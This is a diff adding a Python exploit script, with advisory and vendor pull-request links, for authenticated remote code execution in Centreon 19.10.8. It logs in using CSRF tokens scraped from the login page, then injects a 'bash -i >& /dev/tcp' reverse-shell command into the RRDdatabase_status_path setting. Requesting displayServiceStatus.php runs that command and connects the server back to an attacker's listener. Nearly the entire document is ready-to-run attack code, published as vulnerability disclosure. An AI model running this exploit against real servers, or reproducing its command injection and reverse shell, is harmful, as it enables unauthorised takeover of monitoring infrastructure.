@@ -1,0 +1,91 @@
+# Exploit Title: Centreo 19.10.8 - 'DisplayServiceStatus' Remote Code Execution
+# Date: 2020-03-25
+# Exploit Author: Engin Demirbilek
+# Vendor Homepage: https://www.centreon.com/
+# Version: 19.10.8
+# Tested on: CentOS
+# Advisory link: https://engindemirbilek.github.io/centreon-19.10-rce
+# Corresponding pull request on github: https://github.com/centreon/centreon/pull/8467#event-3163627607 
+
+#!/usr/bin/python
+
+import requests
+import sys
+import warnings
+from bs4 import BeautifulSoup
+
+warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
+
+if len(sys.argv) < 6:
+	print "Usage: ./exploit.py http(s)://url username password listenerIP listenerPort"
+	exit()
+
+url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+ip = sys.argv[4]
+port = sys.argv[5]
+
+
+req = requests.session()
+print("[+] Retrieving CSRF token...")
+loginPage = req.get(url+"/index.php")
+response = loginPage.text
+s = BeautifulSoup(response, 'html.parser')
+centreon_token = s.find('input', {'name':'centreon_token'})['value']
+
+login_creds = {
+    "useralias": username,
+    "password": password,
+    "submitLogin": "Connect",
+    "centreon_token": centreon_token
+}
+
+
+print("[+] Sendin login request...")
+login = req.post(url+"/index.php", login_creds)
+
+if "incorrect" not in login.text:
+    print("[+] Logged In, retrieving second token")
+
+    page = url + "/main.get.php?p=50118"
+    second_token_req = req.get(page)
+    response = second_token_req.text
+    s = BeautifulSoup(response, 'html.parser')
+    second_token = s.find('input', {'name':'centreon_token'})['value']
+
+    payload = {
+        "RRDdatabase_path": "/var/lib/centreon/metrics/",
+        "RRDdatabase_status_path": ";bash -i >& /dev/tcp/{}/{} 0>&1;".format(ip, port),
+        "RRDdatabase_nagios_stats_path": "/var/lib/centreon/nagios-perf/",
+        "reporting_retention": "365",
+        "archive_retention": "31",
+        "len_storage_mysql": "365",
+        "len_storage_rrd": "180",
+        "len_storage_downtimes": "0",
+        "len_storage_comments": "0",
+        "partitioning_retention": "365",
+        "partitioning_retention_forward": "10",
+        "cpartitioning_backup_directory": "/var/cache/centreon/backup",
+        "audit_log_option": "1",
+        "audit_log_retention": "0",
+        "submitC": "Save",
+        "gopt_id": "",
+        "o": "storage",
+        "o": "storage",
+        "centreon_token": second_token,
+
+
+    }
+    print("[+] Sendin payload...")
+    send_payload = req.post(page, payload)
+
+    trigger_url= url + "/include/views/graphs/graphStatus/displayServiceStatus.php"
+    print("[+] Triggerring payload...")
+    trigger = req.get(trigger_url)
+
+    print("[+] Check your listener !...")
+
+else:
+    print("[-] Wrong credentials")
+    exit()
